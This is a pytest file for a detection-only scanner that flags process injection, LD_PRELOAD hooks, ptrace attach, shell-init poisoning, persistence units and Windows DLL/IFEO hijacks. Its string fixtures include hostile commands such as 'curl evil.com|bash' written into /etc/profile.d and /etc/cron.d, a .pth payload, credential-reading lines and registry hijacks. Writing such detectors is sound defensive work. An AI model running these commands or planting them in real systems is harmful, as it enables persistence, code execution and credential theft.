"""Tests for scripts/lib/process_injection_patterns.py.

Pattern-coverage tests for the Wave-18 distillation round 4 batch C
catalogue (process injection / debugger / LD_PRELOAD-class hooks). Each
of the 10 rules gets one or more positive tests + at least one negative
test exercising the carve-out / allowlist.

The rules are detection-only: every test verifies that the pattern fires
on the attack shape and stays silent on the legitimate shape. No fixture
runs the malicious code — these are pure string-pattern tests.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import process_injection_patterns as pip  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen_ordered() -> None:
    """RULES must be a tuple and contain every advertised rule id."""
    assert isinstance(pip.RULES, tuple)
    rule_ids = {r.id for r in pip.RULES}
    expected = {
        "proc-inject-ld-preload-env",
        "proc-inject-ld-so-preload-fs",
        "proc-inject-container-priv-flags",
        "proc-inject-ptrace-attach-cli",
        "proc-inject-node-loader-require",
        "proc-inject-python-startup-hijack",
        "proc-inject-shell-init-poisoning",
        "proc-inject-runtime-monkeypatch",
        "proc-inject-launchd-systemd-persistence",
        "proc-inject-windows-dll-hijack",
    }
    assert expected == rule_ids


def test_every_rule_has_owasp_mapping() -> None:
    """Every rule maps to an ASI- prefix + valid severity."""
    valid_sev = {"CRITICAL", "HIGH", "MAJOR", "MEDIUM", "LOW"}
    for rule in pip.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in valid_sev, rule.id
        assert rule.description, rule.id
        assert rule.name, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding mirrors the auth_flow_patterns.Finding shape."""
    f = pip.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-04",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "HIGH"
    assert f.owasp_asi == "ASI-04"


def test_scan_empty_text_returns_no_findings() -> None:
    """Empty input must not raise and must return [] (not None)."""
    assert pip.scan_text("") == []
    assert pip.scan_text("   \n\n  ") == []


def _hits(rule_id: str, text: str, **kwargs) -> list[pip.Finding]:
    return [f for f in pip.scan_text(text, **kwargs) if f.rule_id == rule_id]


# ---------- Rule 1 : proc-inject-ld-preload-env --------------------------


def test_ld_preload_in_workflow_yaml_env() -> None:
    """LD_PRELOAD set in a YAML env: block flags CRITICAL."""
    src = (
        "jobs:\n"
        "  build:\n"
        "    env:\n"
        "      LD_PRELOAD: /tmp/evil.so\n"
    )
    hits = _hits("proc-inject-ld-preload-env", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_dyld_insert_libraries_in_workflow_env() -> None:
    """macOS DYLD_INSERT_LIBRARIES is equally critical."""
    src = (
        "env:\n"
        "  DYLD_INSERT_LIBRARIES: /tmp/evil.dylib\n"
    )
    assert _hits("proc-inject-ld-preload-env", src)


def test_ld_preload_in_dockerfile_env() -> None:
    """Dockerfile `ENV LD_PRELOAD …` form is caught."""
    src = "ENV LD_PRELOAD=/tmp/evil.so\n"
    assert _hits("proc-inject-ld-preload-env", src)


def test_ld_library_path_in_shell_export() -> None:
    """Shell export form: `export LD_LIBRARY_PATH=/tmp`."""
    src = "export LD_LIBRARY_PATH=/tmp/poison:/lib\n"
    assert _hits("proc-inject-ld-preload-env", src)


def test_appinit_dlls_windows_env() -> None:
    """Windows AppInit_DLLs registry-equivalent env form."""
    src = "env:\n  APPINIT_DLLS: C:\\evil.dll\n"
    assert _hits("proc-inject-ld-preload-env", src)


def test_ld_bind_now_one_is_legitimate_hardening() -> None:
    """LD_BIND_NOW=1 is legitimate startup hardening — must not flag."""
    src = "env:\n  LD_BIND_NOW: 1\n"
    assert not _hits("proc-inject-ld-preload-env", src)


def test_ld_debug_diagnostic_with_numeric_is_high_not_critical() -> None:
    """LD_DEBUG=all (no path) downgrades to HIGH severity."""
    src = "env:\n  LD_DEBUG: all\n"
    hits = _hits("proc-inject-ld-preload-env", src)
    assert hits
    assert hits[0].severity in {"HIGH", "CRITICAL"}


def test_path_setting_no_match() -> None:
    """A plain PATH= must not match (no LD_ / DYLD_ prefix)."""
    src = "env:\n  PATH: /usr/local/bin\n"
    assert not _hits("proc-inject-ld-preload-env", src)


# ---------- Rule 2 : proc-inject-ld-so-preload-fs ------------------------


def test_etc_ld_so_preload_echo_write() -> None:
    """`echo /tmp/x.so > /etc/ld.so.preload` is canonical."""
    src = "echo /tmp/evil.so > /etc/ld.so.preload\n"
    assert _hits("proc-inject-ld-so-preload-fs", src)


def test_etc_ld_so_preload_tee_write() -> None:
    """`tee -a /etc/ld.so.preload` write."""
    src = "echo /tmp/evil.so | tee -a /etc/ld.so.preload\n"
    assert _hits("proc-inject-ld-so-preload-fs", src)


def test_etc_ld_so_conf_d_write() -> None:
    """`/etc/ld.so.conf.d/zz-evil.conf` write."""
    src = "cat > /etc/ld.so.conf.d/zz-evil.conf\n"
    assert _hits("proc-inject-ld-so-preload-fs", src)


def test_etc_ld_so_preload_python_source() -> None:
    """Source-level open() on /etc/ld.so.preload (source mode only)."""
    src = "Path('/etc/ld.so.preload').write_text(payload)\n"
    assert _hits("proc-inject-ld-so-preload-fs", src, file_kind="source")


def test_other_etc_file_no_match() -> None:
    """`/etc/hosts` write is a different attack and must not match."""
    src = "echo '127.0.0.1 evil.com' >> /etc/hosts\n"
    assert not _hits("proc-inject-ld-so-preload-fs", src)


# ---------- Rule 3 : proc-inject-container-priv-flags --------------------


def test_docker_run_privileged_flag() -> None:
    """`docker run --privileged …` flags HIGH."""
    src = "docker run --privileged -v $PWD:/work img\n"
    assert _hits("proc-inject-container-priv-flags", src)


def test_docker_run_cap_add_sys_ptrace() -> None:
    """`--cap-add=SYS_PTRACE` enables ptrace from container."""
    src = "docker run --cap-add=SYS_PTRACE img\n"
    assert _hits("proc-inject-container-priv-flags", src)


def test_docker_run_seccomp_unconfined() -> None:
    """`--security-opt seccomp=unconfined` opens every syscall."""
    src = "docker run --security-opt seccomp=unconfined img\n"
    assert _hits("proc-inject-container-priv-flags", src)


def test_docker_run_pid_host() -> None:
    """`--pid=host` shares host process namespace."""
    src = "docker run --pid=host img\n"
    assert _hits("proc-inject-container-priv-flags", src)


def test_docker_socket_bind_via_v_flag() -> None:
    """`-v /var/run/docker.sock:...` bind (source-mode pass-2 detector)."""
    src = "docker run -v /var/run/docker.sock:/var/run/docker.sock img\n"
    assert _hits("proc-inject-container-priv-flags", src, file_kind="source")


def test_compose_privileged_true() -> None:
    """compose `privileged: true` (source-mode pass-2 detector)."""
    src = (
        "services:\n"
        "  worker:\n"
        "    privileged: true\n"
    )
    assert _hits("proc-inject-container-priv-flags", src, file_kind="source")


def test_compose_network_mode_host() -> None:
    """compose `network_mode: host` (source-mode pass-2 detector)."""
    src = (
        "services:\n"
        "  worker:\n"
        "    network_mode: host\n"
    )
    assert _hits("proc-inject-container-priv-flags", src, file_kind="source")


def test_docker_run_narrow_caps_no_match() -> None:
    """Narrow `--cap-add=NET_BIND_SERVICE` alone must not match."""
    src = "docker run --cap-add=NET_BIND_SERVICE img\n"
    assert not _hits("proc-inject-container-priv-flags", src)


# ---------- Rule 4 : proc-inject-ptrace-attach-cli -----------------------


def test_gdb_attach_pid() -> None:
    """`gdb -p 1234` non-interactive attach."""
    src = "gdb -batch -p 1234 -ex 'p stuff'\n"
    assert _hits("proc-inject-ptrace-attach-cli", src)


def test_lldb_attach_pid() -> None:
    """`lldb -p 1234` non-interactive attach."""
    src = "lldb -p 1234\n"
    assert _hits("proc-inject-ptrace-attach-cli", src)


def test_strace_attach_pid() -> None:
    """`strace -p 1234` attaches and reads syscalls."""
    src = "strace -f -p 1234\n"
    assert _hits("proc-inject-ptrace-attach-cli", src)


def test_frida_attach_pid() -> None:
    """`frida -p 1234` instruments any process."""
    src = "frida -p 1234 -l hook.js\n"
    assert _hits("proc-inject-ptrace-attach-cli", src)


def test_ptrace_source_c_constant() -> None:
    """C source: `ptrace(PTRACE_ATTACH, ...)` (source-mode)."""
    src = "ptrace(PTRACE_ATTACH, target_pid, 0, 0);\n"
    assert _hits("proc-inject-ptrace-attach-cli", src, file_kind="source")


def test_ptrace_source_go_syscall() -> None:
    """Go: `syscall.PtraceAttach(pid)` (source-mode)."""
    src = "err := syscall.PtraceAttach(targetPid)\n"
    assert _hits("proc-inject-ptrace-attach-cli", src, file_kind="source")


def test_ptrace_source_python_process_vm_writev() -> None:
    """Python: `process_vm_writev(...)` (source-mode)."""
    src = "ret = process_vm_writev(pid, iov_local, 1, iov_remote, 1, 0)\n"
    assert _hits("proc-inject-ptrace-attach-cli", src, file_kind="source")


def test_yama_ptrace_scope_bypass() -> None:
    """`sysctl kernel.yama.ptrace_scope=0` weakens YAMA (source-mode)."""
    src = "sysctl -w kernel.yama.ptrace_scope=0\n"
    hits = _hits("proc-inject-ptrace-attach-cli", src, file_kind="source")
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_gdb_help_no_pid_no_match() -> None:
    """`gdb --help` without -p must not flag."""
    src = "gdb --help\n"
    assert not _hits("proc-inject-ptrace-attach-cli", src)


# ---------- Rule 5 : proc-inject-node-loader-require ---------------------


def test_node_options_require_env() -> None:
    """`NODE_OPTIONS=--require=/tmp/evil.js` in env."""
    src = "env:\n  NODE_OPTIONS: --require=/tmp/evil.js\n"
    assert _hits("proc-inject-node-loader-require", src)


def test_node_options_loader_env() -> None:
    """`NODE_OPTIONS=--experimental-loader=…`."""
    src = "export NODE_OPTIONS=--experimental-loader=/tmp/evil.mjs\n"
    assert _hits("proc-inject-node-loader-require", src)


def test_node_options_inspect_brk_external() -> None:
    """`--inspect-brk=0.0.0.0:9229` exposes debugger to network."""
    src = "env:\n  NODE_OPTIONS: --inspect-brk=0.0.0.0:9229\n"
    assert _hits("proc-inject-node-loader-require", src)


def test_node_direct_require_cli() -> None:
    """Direct `node --require=/tmp/evil.js script.js` (source-mode)."""
    src = "node --require=/tmp/evil.js app.js\n"
    assert _hits("proc-inject-node-loader-require", src, file_kind="source")


def test_node_vm_runincontext_tainted() -> None:
    """`vm.runInNewContext(req.body, sandbox)` is tainted-eval (source)."""
    src = "vm.runInNewContext(req.body, sandbox);\n"
    assert _hits("proc-inject-node-loader-require", src, file_kind="source")


def test_node_options_max_old_space_size_legitimate() -> None:
    """Memory-cap option is legitimate; must not flag."""
    src = "env:\n  NODE_OPTIONS: --max-old-space-size=4096\n"
    assert not _hits("proc-inject-node-loader-require", src)


# ---------- Rule 6 : proc-inject-python-startup-hijack -------------------


def test_pythonstartup_env_in_workflow() -> None:
    """`PYTHONSTARTUP: /tmp/evil.py` in workflow env."""
    src = "env:\n  PYTHONSTARTUP: /tmp/evil.py\n"
    assert _hits("proc-inject-python-startup-hijack", src)


def test_pythonpath_dot_in_dockerfile() -> None:
    """`ENV PYTHONPATH=.` prepends CWD (os.py shadow)."""
    src = "ENV PYTHONPATH=.\n"
    assert _hits("proc-inject-python-startup-hijack", src)


def test_pythoninspect_env() -> None:
    """`PYTHONINSPECT=1` drops to REPL after script."""
    src = "export PYTHONINSPECT=1\n"
    assert _hits("proc-inject-python-startup-hijack", src)


def test_pythondontwritebytecode_is_medium_severity() -> None:
    """`PYTHONDONTWRITEBYTECODE=1` is hardening; downgrade to MEDIUM."""
    src = "env:\n  PYTHONDONTWRITEBYTECODE: 1\n"
    hits = _hits("proc-inject-python-startup-hijack", src)
    assert hits
    assert hits[0].severity == "MEDIUM"


def test_pth_file_with_import_critical() -> None:
    """`.pth` body with `import os` is CRITICAL (pth mode)."""
    src = "import os; os.system('curl evil.com')\n"
    hits = _hits("proc-inject-python-startup-hijack", src, file_kind="pth")
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_pth_file_with_only_path_no_match() -> None:
    """`.pth` body with only a path entry is harmless (pth mode)."""
    src = "/usr/local/lib/python3.12/site-packages/myextra\n"
    assert not _hits("proc-inject-python-startup-hijack", src, file_kind="pth")


def test_pthonbuffered_unrelated_no_match() -> None:
    """`PYTHONUNBUFFERED=1` is hardening (not in our list); must not flag."""
    src = "env:\n  PYTHONUNBUFFERED: 1\n"
    assert not _hits("proc-inject-python-startup-hijack", src)


# ---------- Rule 7 : proc-inject-shell-init-poisoning --------------------


def test_etc_profile_d_write() -> None:
    """`echo … > /etc/profile.d/zz-evil.sh` poisons all logins."""
    src = "echo 'curl evil.com|bash' > /etc/profile.d/zz-evil.sh\n"
    assert _hits("proc-inject-shell-init-poisoning", src)


def test_bashrc_d_write() -> None:
    """`echo … >> ~/.bashrc.d/evil.sh` (auto-sourced)."""
    src = "echo 'export TOKEN=$(cat /root/.aws)' >> ~/.bashrc.d/init.sh\n"
    assert _hits("proc-inject-shell-init-poisoning", src)


def test_zshrc_tee_write() -> None:
    """`tee -a ~/.zshrc` for shell-init poisoning."""
    src = "cat payload | tee -a ~/.zshrc\n"
    assert _hits("proc-inject-shell-init-poisoning", src)


def test_etc_bash_bashrc_write() -> None:
    """`echo > /etc/bash.bashrc` system-wide login poison."""
    src = "echo 'alias ls=evil' >> /etc/bash.bashrc\n"
    assert _hits("proc-inject-shell-init-poisoning", src)


def test_other_dotfile_no_match() -> None:
    """`echo > ~/.gitconfig` is not shell-init."""
    src = "echo 'config' > ~/.gitconfig\n"
    assert not _hits("proc-inject-shell-init-poisoning", src)


# ---------- Rule 8 : proc-inject-runtime-monkeypatch ---------------------


def test_socket_socket_reassign_in_source() -> None:
    """`socket.socket = my_wrapper` at module level is patch."""
    src = "import socket\nsocket.socket = my_evil_wrapper\n"
    assert _hits("proc-inject-runtime-monkeypatch", src, file_kind="source")


def test_requests_get_reassign_flagged() -> None:
    """`requests.get = ...` reassignment."""
    src = "requests.get = lambda url, **k: open('exfil', 'a').write(url)\n"
    assert _hits("proc-inject-runtime-monkeypatch", src, file_kind="source")


def test_anthropic_client_reassign_flagged() -> None:
    """`anthropic.Anthropic = MyHijack` is a high-value target."""
    src = "anthropic.Anthropic = HijackClient\n"
    assert _hits("proc-inject-runtime-monkeypatch", src, file_kind="source")


def test_subprocess_popen_reassign_flagged() -> None:
    """`subprocess.Popen = my_wrap` is patch."""
    src = "subprocess.Popen = my_wrap\n"
    assert _hits("proc-inject-runtime-monkeypatch", src, file_kind="source")


def test_monkeypatch_with_orig_wrapper_allowlisted() -> None:
    """`socket.socket = wrap(socket._orig_socket)` is legitimate wrapper."""
    src = (
        "_orig_socket = socket.socket\n"
        "socket.socket = wrap(_orig_socket)\n"
    )
    assert not _hits("proc-inject-runtime-monkeypatch", src, file_kind="source")


def test_monkeypatch_with_mock_allowlisted() -> None:
    """`socket.socket = Mock(spec=...)` is a test fixture."""
    src = "socket.socket = Mock(spec=socket.socket)\n"
    assert not _hits("proc-inject-runtime-monkeypatch", src, file_kind="source")


def test_sys_settrace_in_source_flagged() -> None:
    """`sys.settrace(handler)` registers debugger hook."""
    src = "import sys\nsys.settrace(my_tracer)\n"
    hits = _hits("proc-inject-runtime-monkeypatch", src, file_kind="source")
    assert hits


def test_signal_swallow_handler_flagged() -> None:
    """`signal.signal(SIGTERM, lambda *_: None)` swallows SIGTERM."""
    src = (
        "import signal\n"
        "def silencer(signum, frame):\n"
        "    pass\n"
        "signal.signal(signal.SIGTERM, silencer)\n"
        "while True:\n"
        "    time.sleep(60)\n"
    )
    hits = _hits("proc-inject-runtime-monkeypatch", src, file_kind="source")
    assert hits


def test_signal_handler_with_exit_not_flagged() -> None:
    """Handler that calls sys.exit is legitimate cleanup."""
    src = (
        "import signal, sys\n"
        "def cleanup(signum, frame):\n"
        "    sys.exit(0)\n"
        "signal.signal(signal.SIGTERM, cleanup)\n"
    )
    # Filter out signal hits — patch hits on unrelated symbols shouldn't be here.
    findings = pip.scan_text(src, file_kind="source")
    swallows = [
        f for f in findings
        if f.rule_id == "proc-inject-runtime-monkeypatch"
        and "signal" in f.matched_text.lower()
    ]
    assert not swallows


def test_monkeypatch_in_test_file_downgraded() -> None:
    """Monkey-patch in tests/foo.py downgrades to MEDIUM."""
    src = "socket.socket = stub_socket\n"
    hits = _hits(
        "proc-inject-runtime-monkeypatch",
        src,
        file_kind="source",
        file_path="tests/test_something.py",
    )
    assert hits
    assert hits[0].severity == "MEDIUM"


# ---------- Rule 9 : proc-inject-launchd-systemd-persistence -------------


def test_systemd_user_service_write() -> None:
    """Write to `~/.config/systemd/user/evil.service`."""
    src = "cat > ~/.config/systemd/user/sysmon.service\n"
    assert _hits("proc-inject-launchd-systemd-persistence", src)


def test_systemd_system_service_write() -> None:
    """Write to `/etc/systemd/system/evil.service`."""
    src = "cp evil.service /etc/systemd/system/evil.service\n"
    assert _hits("proc-inject-launchd-systemd-persistence", src)


def test_launch_agents_plist_write() -> None:
    """Write to `~/Library/LaunchAgents/com.evil.plist` on macOS."""
    src = "cat > ~/Library/LaunchAgents/com.evil.helper.plist\n"
    assert _hits("proc-inject-launchd-systemd-persistence", src)


def test_etc_cron_d_write() -> None:
    """Write to `/etc/cron.d/zz-evil` poisons all crontab runs."""
    src = "echo '* * * * * root curl evil.com|bash' > /etc/cron.d/zz-evil\n"
    assert _hits("proc-inject-launchd-systemd-persistence", src)


def test_schtasks_create_windows() -> None:
    """`schtasks /create` on Windows runner (source-mode)."""
    src = "schtasks /create /tn evil /tr evil.exe /sc minute\n"
    assert _hits("proc-inject-launchd-systemd-persistence", src, file_kind="source")


def test_persistence_activate_alone_low() -> None:
    """`systemctl --user enable foo` alone is LOW (no write in file)."""
    src = "systemctl --user enable myapp.service\n"
    hits = _hits("proc-inject-launchd-systemd-persistence", src, file_kind="source")
    assert hits
    assert hits[0].severity == "LOW"


def test_persistence_write_plus_activate_critical() -> None:
    """Write + activate in same file escalates to CRITICAL."""
    src = (
        "cat > ~/.config/systemd/user/sysmon.service <<EOF\n"
        "[Service]\nExecStart=/tmp/evil\nEOF\n"
        "systemctl --user enable sysmon.service\n"
    )
    findings = pip.scan_text(src, file_kind="source")
    persistence = [
        f for f in findings
        if f.rule_id == "proc-inject-launchd-systemd-persistence"
    ]
    # There must be a CRITICAL activate finding paired with the write.
    severities = {f.severity for f in persistence}
    assert "CRITICAL" in severities


def test_other_unit_write_no_match() -> None:
    """`echo > /etc/nginx/nginx.conf` is not a persistence unit."""
    src = "echo 'server {}' > /etc/nginx/nginx.conf\n"
    assert not _hits("proc-inject-launchd-systemd-persistence", src)


# ---------- Rule 10 : proc-inject-windows-dll-hijack ---------------------


def test_reg_add_appinit_dlls_root() -> None:
    """`reg add HKLM\\…\\Windows NT\\CurrentVersion\\Windows`."""
    src = (
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" '
        '/v AppInit_DLLs /t REG_SZ /d c:\\evil.dll /f\n'
    )
    assert _hits("proc-inject-windows-dll-hijack", src)


def test_reg_add_ifeo_debugger() -> None:
    """`reg add HKLM\\…\\Image File Execution Options` IFEO hijack."""
    src = (
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'
        '\\Image File Execution Options\\notepad.exe" '
        '/v Debugger /t REG_SZ /d c:\\evil.exe /f\n'
    )
    assert _hits("proc-inject-windows-dll-hijack", src)


def test_reg_add_knowndlls() -> None:
    """`reg add HKLM\\SYSTEM\\…\\Session Manager\\KnownDLLs`."""
    src = (
        'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control'
        '\\Session Manager\\KnownDLLs" /v evil /t REG_SZ /d evil.dll /f\n'
    )
    assert _hits("proc-inject-windows-dll-hijack", src)


def test_setx_appinit_dlls() -> None:
    """`setx APPINIT_DLLS C:\\evil.dll` per-user (source-mode)."""
    src = "setx APPINIT_DLLS C:\\evil.dll\n"
    assert _hits("proc-inject-windows-dll-hijack", src, file_kind="source")


def test_powershell_set_itemproperty_ifeo() -> None:
    """PS `Set-ItemProperty HKLM:\\…\\Image File Execution Options` (source)."""
    src = (
        'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT'
        '\\CurrentVersion\\Image File Execution Options\\notepad.exe" '
        '-Name Debugger -Value "c:\\evil.exe"\n'
    )
    assert _hits("proc-inject-windows-dll-hijack", src, file_kind="source")


def test_reg_query_no_match() -> None:
    """`reg query` (read-only) must not flag."""
    src = 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"\n'
    assert not _hits("proc-inject-windows-dll-hijack", src)


# ---------- Cross-rule integration / hygiene -----------------------------


def test_scan_returns_unique_findings() -> None:
    """Same rule on same line must not emit duplicates."""
    src = "env:\n  LD_PRELOAD: /tmp/evil.so\n"
    findings = pip.scan_text(src)
    keys = [(f.rule_id, f.line, f.column) for f in findings]
    assert len(keys) == len(set(keys))


def test_scan_findings_are_sorted() -> None:
    """scan_text() returns findings sorted by (line, column, rule_id)."""
    src = (
        "env:\n"
        "  LD_PRELOAD: /tmp/evil.so\n"
        "  PYTHONSTARTUP: /tmp/evil.py\n"
    )
    findings = pip.scan_text(src)
    keys = [(f.line, f.column, f.rule_id) for f in findings]
    assert keys == sorted(keys)


def test_long_match_truncated_with_ellipsis() -> None:
    """Matched text > 200 chars is truncated with an ellipsis."""
    long_path = "/tmp/" + "a" * 250 + ".so"
    src = f"env:\n  LD_PRELOAD: {long_path}\n"
    findings = pip.scan_text(src)
    assert findings
    target = next(
        (f for f in findings if f.rule_id == "proc-inject-ld-preload-env"),
        None,
    )
    assert target is not None
    assert len(target.matched_text) <= 201


def test_scan_text_does_not_mutate_input() -> None:
    """scan_text() is a pure function over its input."""
    src = "env:\n  LD_PRELOAD: /tmp/evil.so\n"
    snapshot = src
    pip.scan_text(src)
    assert src == snapshot


def test_no_rule_id_collision_with_other_modules() -> None:
    """Our rule ids are unique to this module — no clash with the
    siblings (auth_flow_patterns, log_telemetry_patterns)."""
    our_ids = {r.id for r in pip.RULES}
    # Spot-check: every id starts with our namespace prefix.
    for rid in our_ids:
        assert rid.startswith("proc-inject-"), rid


def test_every_pattern_compiles_re2_safe() -> None:
    """Every catalogued Rule.pattern is a compiled `re.Pattern`."""
    import re
    for rule in pip.RULES:
        assert isinstance(rule.pattern, re.Pattern), rule.id
